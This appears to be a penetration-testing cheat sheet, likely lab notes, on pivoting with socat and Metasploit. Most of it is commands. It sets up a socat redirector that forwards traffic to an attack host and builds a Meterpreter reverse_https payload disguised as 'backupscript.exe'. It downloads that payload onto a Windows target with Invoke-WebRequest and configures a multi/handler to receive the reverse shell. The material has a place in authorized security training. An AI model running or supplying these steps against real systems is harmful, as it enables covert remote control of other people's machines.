>[!tldr] Socat is a bidirectional relay tool that creates pipe sockets between 2 independent network channels without SSH tunneling. It acts as a redirector that can listen on one host and port and forward the data to another IP address and port

#### Start Socat Listener
```go
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

	NOTE: Listens on port 8080 and forwards all traffic to port 80 on attack host

Now create a payload to connect back to your redirector on the Ubuntu server

#### Create msfvenom payload
```go
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

You can transfer the payload via a python server or using the below PowerShell cmdlet Invoke-WebRequest:
```powershell
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

#### Start MSF Console
```go
sudo msfconsole
```

#### Configuring & Starting the multi/handler
```go
use exploit/multi/handler
```

```go
set payload windows/x64/meterpreter/reverse_https
```

```go
set lhost 0.0.0.0
```

```go
set lport 80
```

```go
run
```

